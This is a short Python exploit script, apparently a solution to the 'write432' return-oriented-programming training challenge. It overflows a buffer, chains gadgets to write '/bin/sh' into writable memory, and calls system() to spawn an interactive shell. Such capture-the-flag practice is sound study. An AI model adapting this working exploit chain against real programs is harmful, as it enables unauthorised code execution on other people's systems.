from pwn import *

p = process('./write432')

system_plt = 0x08048430
data_addr = 0x0804A040
#data_addr = 0x0804A029
#data_addr = 0x0804A028
mov_edi_ebp = 0x08048670
pop_edi_ebp = 0x080486da
pad = 'A'*44

payload = pad
payload += p32(pop_edi_ebp)

payload += p32(data_addr)
payload += '/bin'
payload += p32(mov_edi_ebp)
payload += p32(pop_edi_ebp)
payload += p32(data_addr+4)
payload += '/sh\x00'
payload += p32(mov_edi_ebp)
payload += p32(system_plt)
payload += 'BBBB'
payload += p32(data_addr)

p.sendline(payload)
p.interactive()
